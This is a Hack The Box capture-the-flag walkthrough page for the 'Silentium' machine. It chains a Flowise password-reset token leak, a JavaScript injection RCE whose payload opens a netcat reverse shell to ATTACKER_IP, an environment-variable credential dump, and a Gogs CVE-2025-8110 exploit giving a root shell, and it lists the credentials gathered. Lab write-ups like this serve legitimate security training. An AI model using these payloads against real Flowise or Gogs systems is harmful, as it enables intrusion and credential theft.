<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Silentium HTB Writeup – John Carreño</title>
    <!-- Google Fonts & Font Awesome -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', sans-serif;
            line-height: 1.6;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #1a1a2a;
        }
        ::-webkit-scrollbar-thumb {
            background: #7c3aed;
            border-radius: 10px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        /* Header / Hero – Morado/negro elegante */
        .hero {
            text-align: center;
            padding: 3rem 1rem;
            background: linear-gradient(135deg, #0f0f1a 0%, #2a1a3a 100%);
            border-radius: 2rem;
            margin-bottom: 3rem;
            border: 1px solid #7c3aed40;
            box-shadow: 0 20px 35px -15px rgba(0,0,0,0.5);
        }
        .hero h1 {
            font-size: 2.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #c084fc, #a855f7);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
        }
        .hero .badge {
            display: inline-block;
            background: #7c3aed;
            padding: 0.3rem 1rem;
            border-radius: 40px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-top: 1rem;
        }
        .hero .stats {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-top: 2rem;
            flex-wrap: wrap;
        }
        .stat-card {
            background: rgba(124, 58, 237, 0.15);
            padding: 0.7rem 1.5rem;
            border-radius: 60px;
            backdrop-filter: blur(4px);
            font-family: 'JetBrains Mono', monospace;
            border: 1px solid #7c3aed30;
        }

        /* Cards */
        .card {
            background: #11111a;
            border-radius: 1.5rem;
            padding: 1.8rem;
            margin-bottom: 2rem;
            border: 1px solid #2a2a3a;
            transition: transform 0.2s, border-color 0.2s;
        }
        .card:hover {
            border-color: #7c3aed;
            transform: translateY(-3px);
        }
        .card h2 {
            font-size: 1.6rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            border-left: 4px solid #a855f7;
            padding-left: 1rem;
        }
        .card h2 i {
            color: #a855f7;
            font-size: 1.5rem;
        }
        .card h3 {
            font-size: 1.2rem;
            margin: 1rem 0 0.5rem;
            color: #c084fc;
        }

        /* Code blocks */
        pre {
            background: #0b0b12;
            padding: 1.2rem;
            border-radius: 1rem;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            border: 1px solid #2a2a3a;
            margin: 1rem 0;
            position: relative;
        }
        code {
            font-family: 'JetBrains Mono', monospace;
            background: #1a1a2a;
            padding: 0.2rem 0.4rem;
            border-radius: 0.5rem;
            font-size: 0.85rem;
            color: #e0e0e0;
        }
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #2a2a3a;
            border: none;
            color: #ccc;
            padding: 4px 8px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.7rem;
            transition: 0.2s;
        }
        .copy-btn:hover {
            background: #7c3aed;
            color: white;
        }

        /* Tables */
        .info-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        .info-table td, .info-table th {
            padding: 0.75rem;
            border-bottom: 1px solid #2a2a3a;
        }
        .info-table th {
            text-align: left;
            width: 200px;
            color: #c084fc;
        }

        /* Flags redacted */
        .flag {
            background: linear-gradient(135deg, #0f0f1a, #1a1a2a);
            padding: 1rem;
            border-radius: 1rem;
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            font-weight: bold;
            letter-spacing: 1px;
            border: 1px solid #7c3aed;
            margin: 1rem 0;
        }

        .redacted {
            background: #1a1a2a;
            color: #c084fc;
            padding: 0.2rem 0.6rem;
            border-radius: 12px;
            font-family: monospace;
        }

        .footer {
            text-align: center;
            padding: 2rem;
            margin-top: 3rem;
            border-top: 1px solid #2a2a3a;
            color: #6b7280;
        }

        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            .hero h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <!-- Hero Section – sin calavera, tonos morados -->
    <div class="hero">
        <h1><i class="fas fa-terminal"></i> Silentium HTB – Root Walkthrough</h1>
        <p>From recon to root — Full exploitation chain on a Linux target.</p>
        <div class="stats">
            <div class="stat-card"><i class="fas fa-microchip"></i> Linux · Ubuntu 24.04</div>
            <div class="stat-card"><i class="fas fa-chart-line"></i> Difficulty: Medium</div>
            <div class="stat-card"><i class="fas fa-trophy"></i> Flags: user + root</div>
        </div>
        <div class="badge"><i class="fas fa-user-astronaut"></i> Writeup by John Carreño</div>
    </div>

    <!-- Reconnaissance -->
    <div class="card">
        <h2><i class="fas fa-search"></i> 1. Recon & Subdomain Enumeration</h2>
        <p>Initial nmap scan shows only two open ports: <code>22 (SSH)</code> and <code>80 (HTTP)</code>. The web server redirects to <code>silentium.htb</code>.</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>nmap -Pn 10.129.33.24
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</pre>
        <p>Vhost enumeration with gobuster reveals a hidden subdomain:</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
[...]
staging.silentium.htb   Status: 200 [Size: 3142]</pre>
        <p><strong>Key finding:</strong> <code>staging.silentium.htb</code> hosts a <strong>Flowise AI</strong> instance.</p>
    </div>

    <!-- Flowise Account Takeover -->
    <div class="card">
        <h2><i class="fas fa-user-secret"></i> 2. Flowise – Password Reset Abuse</h2>
        <p>Flowise exposes unauthenticated API endpoints. The <code>/api/v1/account/forgot-password</code> endpoint leaks a valid <code>tempToken</code>.</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'</pre>
        <p>Using the leaked token, we reset the password for <code>ben@silentium.htb</code>:</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"LEAKED_TOKEN","password":"MyPassword123"}}'</pre>
        <p><i class="fas fa-key"></i> <strong>Flowise credentials:</strong> <code>ben@silentium.htb : MyPassword123</code></p>
    </div>

    <!-- RCE & Docker Escape -->
    <div class="card">
        <h2><i class="fas fa-dharmachakra"></i> 3. Authenticated RCE & Docker Breakout</h2>
        <p>The endpoint <code>/api/v1/node-load-method/customMCP</code> evaluates server‑side JavaScript, leading to remote command execution.</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span># payload.json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 5555 >/tmp/f');return 1;})()} )"
  }
}</pre>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d @payload.json</pre>
        <p>The exploit grants a <strong>root shell inside the Docker container</strong>. Dumping environment variables reveals SSH credentials for the host:</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>env | grep -E "PASSWORD|SMTP"
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_PASSWORD=F1l3_d0ck3r</pre>
        <p><i class="fas fa-database"></i> <strong>Host SSH password:</strong> <code>ben : r04D!!_R4ge</code></p>
    </div>

    <!-- SSH Access & User Flag -->
    <div class="card">
        <h2><i class="fas fa-terminal"></i> 4. SSH Access & User Flag</h2>
        <p>Connect to the host via SSH using the extracted password.</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>ssh ben@10.129.33.24
password: r04D!!_R4ge</pre>
        <div class="flag">
            <i class="fas fa-flag-checkered"></i> user.txt → <span class="redacted">REDACTED (find it yourself)</span>
        </div>
    </div>

    <!-- Privilege Escalation with Gogs -->
    <div class="card">
        <h2><i class="fas fa-crown"></i> 5. Privilege Escalation – CVE-2025-8110 (Gogs)</h2>
        <p>While enumerating the host, a <strong>Gogs</strong> instance is found listening on port <code>3001</code>. Gogs is vulnerable to CVE-2025-8110 (symlink‑based RCE).</p>
        <p>Create an SSH tunnel to access Gogs locally:</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>ssh -L 3001:localhost:3001 ben@10.129.33.24</pre>
        <p>Register a new user on <code>http://localhost:3001</code> and generate an API token.</p>
        <p>Run the public exploit with the registered credentials:</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>python3 CVE-2025-8110.py -u http://localhost:3001 -lh ATTACKER_IP -lp 5555 -un user -pw 'YourPassword123!'</pre>
        <p>The exploit injects a malicious <code>sshCommand</code> into a repository. When Gogs (running as <strong>root</strong>) performs a <code>git push</code>, a reverse shell is executed with root privileges.</p>
        <pre><span class="copy-btn" onclick="copyCode(this)">Copy</span>nc -lvnp 5555
connect to [ATTACKER_IP] from [10.129.33.24] 49276
root@silentium:~# whoami
root</pre>
        <div class="flag">
            <i class="fas fa-skull-crossbones"></i> root.txt → <span class="redacted">REDACTED (capture it yourself)</span>
        </div>
    </div>

    <!-- Credential Table -->
    <div class="card">
        <h2><i class="fas fa-passport"></i> 6. Gathered Credentials</h2>
        <table class="info-table">
            <tr><th>Service</th><th>Username</th><th>Password / Token</th></tr>
            <tr><td>Flowise</td><td>ben@silentium.htb</td><td>MyPassword123</td></tr>
            <tr><td>SSH (host)</td><td>ben</td><td>r04D!!_R4ge</td></tr>
            <tr><td>Gogs (web)</td><td>user</td><td>User123!@#</td></tr>
            <tr><td>Flowise API Key</td><td>-</td><td>hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc</td></tr>
        </table>
    </div>

    <!-- Tools Used -->
    <div class="card">
        <h2><i class="fas fa-tools"></i> 7. Tools Used</h2>
        <div style="display: flex; flex-wrap: wrap; gap: 1rem; margin-top: 1rem;">
            <span class="stat-card">nmap</span>
            <span class="stat-card">gobuster</span>
            <span class="stat-card">curl</span>
            <span class="stat-card">ssh</span>
            <span class="stat-card">netcat</span>
            <span class="stat-card">python3</span>
            <span class="stat-card">git</span>
            <span class="stat-card">Burp Suite</span>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <i class="fas fa-laptop-code"></i> Silentium HTB – Writeup by <strong>John Carreño</strong><br>
        <span style="font-size: 0.8rem;">#HackTheBox #Pentesting #Flowise #Gogs #CVE-2025-8110</span>
    </div>
</div>

<script>
    function copyCode(btn) {
        const pre = btn.parentElement;
        let code = pre.innerText.replace('Copy', '').trim();
        code = code.replace(/Copy$/, '').trim();
        navigator.clipboard.writeText(code);
        btn.textContent = 'Copied!';
        setTimeout(() => btn.textContent = 'Copy', 2000);
    }
</script>
</body>
</html>
